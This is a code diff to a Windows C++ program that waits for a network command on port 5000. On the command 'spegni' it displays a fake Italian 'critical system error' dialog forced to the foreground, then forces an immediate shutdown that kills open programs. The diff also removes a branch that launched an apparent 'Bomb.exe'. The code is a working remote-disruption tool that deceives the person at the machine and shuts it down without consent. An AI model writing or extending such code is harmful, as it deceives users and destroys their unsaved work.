@@ -16,14 +16,16 @@ int WINAPI WinMain(
         if (reciver->startAndAccept(5000)) {
             receiveMessage = reciver->receiveMessage();
             if (receiveMessage=="spegni") {
-                MessageBoxA(NULL,"Si e' verificato un errore critico.\nIl sistema verra' arrestato in meno di 3 secondi.","Errore di sistema",MB_OK | MB_ICONERROR);
+                std::thread([]() {
+                    MessageBoxA(
+                        NULL,
+                        "Si e' verificato un errore critico.\nIl sistema verra' arrestato in meno di 3 secondi.",
+                        "Errore di sistema",
+                        MB_OK | MB_ICONERROR | MB_TOPMOST | MB_SETFOREGROUND
+                    );
+                }).detach();
                 std::this_thread::sleep_for(std::chrono::seconds(3));
-                system("shutdown /s /t 0");
-            }else if (receiveMessage=="crash") {
-                STARTUPINFOA si{};
-                PROCESS_INFORMATION pi{};
-                si.cb = sizeof(si);
-                CreateProcess("Bomb.exe",nullptr,nullptr,nullptr,FALSE,0,nullptr,nullptr,&si, &pi);
+                system("shutdown /s /f /t 0");
             }
         }
     }
